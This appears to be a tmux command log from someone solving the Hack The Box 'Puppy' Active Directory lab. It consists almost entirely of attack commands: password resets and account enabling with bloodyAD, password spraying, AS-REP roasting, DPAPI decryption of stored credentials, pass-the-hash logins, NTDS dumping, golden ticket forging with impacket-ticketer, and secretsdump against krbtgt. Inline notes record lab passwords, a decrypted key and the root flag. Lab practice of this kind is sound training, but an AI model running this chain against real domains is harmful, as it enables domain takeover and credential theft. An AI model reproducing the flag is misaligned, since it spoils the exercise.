+[2026-02-04 03:43:57] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 03:44:01] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 03:44:04] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 03:44:20] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!' --users
+[2026-02-04 03:48:43] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u Administrator -p 'JamieLove2025!'
+[2026-02-04 03:48:52] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u Administrator -p 'Steve2025!'
+[2026-02-04 03:49:01] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u Administrator -p 'ILY2025!'
+[2026-02-04 03:53:59] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper -p 'Steve2025!'
+[2026-02-04 03:54:14] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper_adm -p 'Steve2025!'
+[2026-02-04 03:55:11] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper_adm -p 'ILY2025!'
+[2026-02-04 03:59:44] [pane=%1] [CMD_START] cd ..
+[2026-02-04 03:59:45] [pane=%1] [CMD_START] ll
+[2026-02-04 03:59:58] [pane=%1] [CMD_START] cd loot
+[2026-02-04 04:01:26] [pane=%1] [CMD_START] cat > puppy_passwords.txt << 'EOF'
+KingofAkron2025!
+HJKL2025!
+Antman2025!
+JamieLove2025!
+Steve2025!
+ILY2025!
+Password123!
+EOF
+[2026-02-04 04:01:32] [pane=%1] [CMD_START] cat puppy_passwords.txt
+[2026-02-04 04:02:09] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper_adm -p puppy_passwords.txt
+[2026-02-04 04:03:30] [pane=%1] [CMD_START] impacket-GetNPUsers puppy.htb/adam.silver:'Password123!' -dc-ip 10.129.232.75 -request -format hashcat
+
+[2026-02-04 04:03:43] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 04:03:47] [pane=%1] [CMD_START] impacket-GetNPUsers puppy.htb/adam.silver:'Password123!' -dc-ip 10.129.232.75 -request -format hashcat
+
+[2026-02-04 04:03:53] [pane=%1] [CMD_START] impacket-GetNPUsers puppy.htb/adam.silver:'Password123!' -dc-ip 10.129.232.75 -request -format hashcat
+
+[2026-02-04 04:04:53] [pane=%1] [CMD_START] impacket-GetNPUsers puppy.htb/adam.silver:'HJKL2025!' -dc-ip 10.129.232.75 -request -format hashcat
+[2026-02-04 04:04:57] [pane=%1] [CMD_START] impacket-GetNPUsers puppy.htb/adam.silver:'Password123!' -dc-ip 10.129.232.75 -request -format hashcat
+
+[2026-02-04 04:06:02] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper_adm -p 'steph2025!'
+[2026-02-04 04:08:57] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper -p puppy_passwords.txt
+[2026-02-04 04:14:19] [pane=%1] [CMD_START] impacket-GetNPUsers puppy.htb/ant.edwards:'Antman2025!' -dc-ip 10.129.232.75 -request -format hashcat
+
+[2026-02-04 04:14:38] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 04:14:43] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 04:14:47] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 04:54:41] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 04:54:44] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 04:54:47] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 04:59:54] [pane=%1] [CMD_START] python3 -m http.server 6969
+[2026-02-04 05:03:17] [pane=%1] [CMD_START] ll
+[2026-02-04 05:03:54] [pane=%1] [CMD_START] ll
+[2026-02-04 05:04:04] [pane=%1] [CMD_START] file site-backup-2024-12-30.zip
+[2026-02-04 05:04:11] [pane=%1] [CMD_START] unzip site-backup-2024-12-30.zip
+[2026-02-04 05:04:20] [pane=%1] [CMD_START] ll
+[2026-02-04 05:04:34] [pane=%1] [CMD_START] cd puppy
+[2026-02-04 05:04:35] [pane=%1] [CMD_START] dir
+[2026-02-04 05:04:36] [pane=%1] [CMD_START] ll
+[2026-02-04 05:04:47] [pane=%1] [CMD_START] file nms-auth-config.xml.bak
+[2026-02-04 05:04:55] [pane=%1] [CMD_START] less nms-auth-config.xml.bak
+[2026-02-04 05:05:18] [pane=%1] [CMD_START] cat nms-auth-config.xml.bak
+[2026-02-04 05:15:14] [pane=%1] [CMD_START] : #note while logged in as adam.silver with reset password and enable user, found Backups directory at based directory that has file site-backup-2024-12-30.zip. downloaded with evil-winrm's download command. Unzipped on Kali, created a puppy directory that has a file called nms-auth-config.xml.bak. this file contains steph.cooper u/n and ChefSteph2025! password.
+[2026-02-04 05:17:36] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
+[2026-02-04 05:17:48] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper_amd -p 'ChefSteph2025!'
+[2026-02-04 05:45:53] [pane=%0] [CMD_START] ll
+[2026-02-04 05:46:11] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper_adm -p 'ChefSteph2025!'
+[2026-02-04 05:47:36] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper -p ChefSteph2025!
+[2026-02-04 05:47:45] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper_adm -p ChefSteph2025!
+[2026-02-04 05:47:54] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
+[2026-02-04 06:02:46] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper_adm -p 'ChefSteph2025!'
+[2026-02-04 06:06:56] [pane=%1] [CMD_START] find . -type f
+[2026-02-04 06:07:55] [pane=%1] [CMD_START] grep -ri "password\|username\|credential" . 2>/dev/null | grep -v ".zip" | head -20
+[2026-02-04 06:10:40] [pane=%1] [CMD_START] find . -type f
+[2026-02-04 06:33:39] [pane=%0] [CMD_START] fg
+[2026-02-04 06:34:22] [pane=%1] [CMD_START] cd ..
+[2026-02-04 06:34:24] [pane=%1] [CMD_START] ll
+[2026-02-04 06:51:53] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
+[2026-02-04 07:07:39] [pane=%1] [CMD_START] ll
+[2026-02-04 07:07:54] [pane=%1] [CMD_START] cd S-1-5-21-1487982659-1829050783-2281216199-1107
+[2026-02-04 07:07:55] [pane=%1] [CMD_START] dir
+[2026-02-04 07:09:40] [pane=%1] [CMD_START] cd ..
+[2026-02-04 07:09:47] [pane=%1] [CMD_START] rm S-1-5-21-1487982659-1829050783-2281216199-1107
+[2026-02-04 07:09:48] [pane=%1] [CMD_START] ll
+[2026-02-04 07:09:53] [pane=%1] [CMD_START] rmdir S-1-5-21-1487982659-1829050783-2281216199-1107
+[2026-02-04 07:09:54] [pane=%1] [CMD_START] ll
+[2026-02-04 07:09:59] [pane=%1] [CMD_START] cat C8D69EBE9A43E9DEBF6B5FBD48B521B9
+[2026-02-04 07:11:21] [pane=%1] [CMD_START] dir
+[2026-02-04 07:11:23] [pane=%1] [CMD_START] ll
+[2026-02-04 07:11:52] [pane=%1] [CMD_START] mkdir dpapi
+[2026-02-04 07:11:53] [pane=%1] [CMD_START] ll
+[2026-02-04 07:12:19] [pane=%1] [CMD_START] mv 556a2412-1275-4ccf-b721-e6a0b4f90407 C8D69EBE9A43E9DEBF6B5FBD48B521B9 dpapi
+[2026-02-04 07:12:20] [pane=%1] [CMD_START] ll
+[2026-02-04 07:12:24] [pane=%1] [CMD_START] cd dpapi
+[2026-02-04 07:12:25] [pane=%1] [CMD_START] dir
+[2026-02-04 07:12:28] [pane=%1] [CMD_START] ll
+[2026-02-04 07:12:43] [pane=%1] [CMD_START] pip3 install pypykatz
+[2026-02-04 07:12:59] [pane=%1] [CMD_START] pipx install pypykatz
+[2026-02-04 07:13:10] [pane=%1] [CMD_START] pipx ensurepath
+[2026-02-04 07:14:02] [pane=%1] [CMD_START] ll
+[2026-02-04 07:15:39] [pane=%1] [CMD_START] pypykatz dpapi credential C8D69EBE9A43E9DEBF6B5FBD48B521B9 --masterkey 556a2412-1275-4ccf-b721-e6a0b4f90407 --password ChefSteph2025!
+[2026-02-04 07:17:17] [pane=%1] [CMD_START] pypykatz dpapi masterkey 556a2412-1275-4ccf-b721-e6a0b4f90407 ChefSteph2025!
+[2026-02-04 07:21:55] [pane=%1] [CMD_START] wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe -O SharpDPAPI.exe
+[2026-02-04 07:21:58] [pane=%1] [CMD_START] ll
+[2026-02-04 07:23:00] [pane=%1] [CMD_START] ip a
+[2026-02-04 07:24:57] [pane=%1] [CMD_START] ip a
+[2026-02-04 07:25:37] [pane=%1] [CMD_START] impacket-smbserver share . -smb2support -username test -password test
+[2026-02-04 07:25:46] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
+[2026-02-04 07:27:09] [pane=%1] [CMD_START] ll
+[2026-02-04 07:27:12] [pane=%1] [CMD_START] impacket-smbserver share . -smb2support -username test -password test
+[2026-02-04 07:27:43] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
+[2026-02-04 07:36:51] [pane=%1] [CMD_START] dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid C8D69EBE9A43E9DEBF6B5FBD48B521B9 -password 'ChefSteph2025!'
+[2026-02-04 18:32:14] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
+[2026-02-04 18:52:41] [pane=%1] [CMD_START] dpapi.py masterkey -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -sid S-1-5-21-1487982659-1829050783-2281216199-1107/556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!'
+[2026-02-04 18:53:15] [pane=%1] [CMD_START] dpapi.py masterkey -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
+[2026-02-04 18:54:18] [pane=%1] [CMD_START] dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
+[2026-02-04 19:03:56] [pane=%1] [CMD_START] : #note use dpapi.py to decrypt the key from C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107 called 556a2412-1275-4ccf-b721-e6a0b4f90407 decrypted key Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+[2026-02-04 19:10:14] [pane=%1] [CMD_START] dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+[2026-02-04 19:16:19] [pane=%1] [CMD_START] : #note used dpapi to decrypt the credential C8D69EBE9A43E9DEBF6B5FBD48B521B9 in directory C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\ using the key from previous step 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+[2026-02-04 19:18:43] [pane=%1] [CMD_START] : #note decrypted credentials are steph.cooper_adm password FivethChipOnItsWay2025!
+[2026-02-04 19:23:48] [pane=%0] [CMD_START] evil-winrm -i 10.129.12.16 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
+[2026-02-04 19:29:15] [pane=%1] [CMD_START] impacket-secretsdump
+[2026-02-04 19:29:44] [pane=%1] [CMD_START] nxc secretsdump
+[2026-02-04 19:32:29] [pane=%1] [CMD_START] nxc smb 10.129.12.16 -u administrator -p 'FivethChipOnItsWay2025!' --ntds --user Administrator
+[2026-02-04 19:32:50] [pane=%1] [CMD_START] nxc smb 10.129.12.16 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds --user Administrator
+[2026-02-04 19:35:17] [pane=%1] [CMD_START] evil-winrm -i 10.129.12.16 -u administrator -H aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b
+[2026-02-04 19:35:32] [pane=%1] [CMD_START] evil-winrm -i 10.129.12.16 -u administrator -H bb0edc15e49ceb4120c7bd7e6e65d75b
+[2026-02-04 19:37:48] [pane=%1] [CMD_START] nxc smb 10.129.12.16 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds --users
+[2026-02-04 19:50:35] [pane=%1] [CMD_START] : #note logged in using steph.cooper_adm's password FivethChipOnItsWay2025! and navigated to Adminstrator Desktop and pull the root flag root.txt d667d5adfba04e5cc5d0b6ca0f9335c4
+[2026-02-04 19:55:13] [pane=%1] [CMD_START] used nxc smb 10.129.12.16 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds --users to dump user hashes
+[2026-02-04 19:55:22] [pane=%1] [CMD_START] : #note used nxc smb 10.129.12.16 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds --users to dump user hashes
+[2026-02-04 20:17:53] [pane=%1] [CMD_START] impacket-ticketer
+[2026-02-04 20:22:37] [pane=%1] [CMD_START] impacket-ticketer -nthash "a4f2989236a639ef3f766e5fe1aad94a" -domain-sid "S-1-5-21-1487982659-1829050783-2281216199" -domain "puppy.htb" "steph.cooper"
+[2026-02-04 20:23:15] [pane=%1] [CMD_START] cd ..
+[2026-02-04 20:23:24] [pane=%1] [CMD_START] mkdir goldenTicket
+[2026-02-04 20:23:27] [pane=%1] [CMD_START] cd goldenTicket
+[2026-02-04 20:23:57] [pane=%1] [CMD_START] impacket-ticketer -nthash "a4f2989236a639ef3f766e5fe1aad94a" -domain-sid "S-1-5-21-1487982659-1829050783-2281216199" -domain "puppy.htb" "theosMom"
+[2026-02-04 20:30:16] [pane=%1] [CMD_START] export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/goldenTicket/theosMom.ccache
+[2026-02-04 20:31:20] [pane=%1] [CMD_START] nxc smb 10.129.12.16 -k --sam
+[2026-02-04 20:34:29] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -k --sam
+[2026-02-04 20:35:05] [pane=%1] [CMD_START] impacket-ticketer -nthash "a4f2989236a639ef3f766e5fe1aad94a" -domain-sid "S-1-5-21-1487982659-1829050783-2281216199" -domain "puppy.htb" "theosMom"
+[2026-02-04 20:35:12] [pane=%1] [CMD_START] ll
+[2026-02-04 20:35:20] [pane=%1] [CMD_START] export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/goldenTicket/theosMom.ccache
+[2026-02-04 20:35:26] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -k --sam
+[2026-02-04 20:35:59] [pane=%1] [CMD_START] export KRB5CCNAME=theosMom.ccache
+[2026-02-04 20:36:03] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -k --sam
+[2026-02-04 20:36:20] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -k --sam --lsa
+[2026-02-04 20:37:16] [pane=%1] [CMD_START] impacket-secretsdump -k 10.129.232.75
+[2026-02-04 20:37:40] [pane=%1] [CMD_START] impacket-secretsdump -k 10.129.232.75 -just-dc-user
+[2026-02-04 20:37:56] [pane=%1] [CMD_START] impacket-secretsdump -k 10.129.232.75 -just-dc-user steph.cooper
+[2026-02-04 20:38:46] [pane=%1] [CMD_START] impacket-secretsdump -k 10.129.232.75 -just-dc-user steph.cooper -use-vss
+[2026-02-04 20:39:07] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -just-dc-user steph.cooper -use-vss
+[2026-02-04 20:39:11] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -just-dc-user steph.cooper
+[2026-02-04 20:39:14] [pane=%1] [CMD_START] ll
+[2026-02-04 20:39:20] [pane=%1] [CMD_START] cat theosMom.ccache
+[2026-02-04 20:41:31] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -just-dc-ntlm -just-dc-user krbtgt
+[2026-02-04 20:42:17] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -just-dc-ntlm -just-dc-user krbtgt -use-vss
+[2026-02-04 20:43:34] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -just-dc-ntlm -just-dc-user steph.cooper -use-vss
+[2026-02-04 20:43:39] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -just-dc-ntlm -just-dc-user steph.cooper
+[2026-02-04 20:44:44] [pane=%1] [CMD_START] impacket-ticketer -nthash "a4f2989236a639ef3f766e5fe1aad94a" -domain-sid "S-1-5-21-1487982659-1829050783-2281216199" -domain "puppy.htb" "krbtgt"
+[2026-02-04 20:45:48] [pane=%1] [CMD_START] export KRB5CCNAME=krbtgt.ccache
+[2026-02-04 20:46:02] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -just-dc-ntlm -just-dc-user steph.cooper
+[2026-02-04 20:46:17] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -just-dc-ntlm -just-dc-user krbtgt
+[2026-02-04 20:46:28] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -just-dc-ntlm -just-dc-user krbtgt -use-vss
+[2026-02-04 20:47:06] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb
+[2026-02-04 20:47:53] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -k sam
+[2026-02-04 20:47:58] [pane=%1] [CMD_START] impacket-secretsdump -k puppy.htb -k --sam
+[2026-02-04 20:48:19] [pane=%1] [CMD_START] nxc smb puppy.htb -k --sam
+[2026-02-04 20:48:26] [pane=%1] [CMD_START] nxc smb puppy.htb -k --lsa
+[2026-02-04 20:48:58] [pane=%1] [CMD_START] impacket-ticketer -nthash "a4f2989236a639ef3f766e5fe1aad94a" -domain-sid "S-1-5-21-1487982659-1829050783-2281216199" -domain "puppy.htb" "administrator"
+[2026-02-04 20:49:08] [pane=%1] [CMD_START] export KRB5CCNAME=administrator.ccache
+[2026-02-04 20:49:16] [pane=%1] [CMD_START] nxc smb puppy.htb -k --sam
+[2026-02-04 20:49:23] [pane=%1] [CMD_START] nxc smb puppy.htb -k --lsa
+[2026-02-04 20:51:08] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
+[2026-02-04 22:27:53] [pane=%1] [CMD_START] exit
+[2026-02-04 22:28:07] [pane=%0] [CMD_START] tmux kill-session
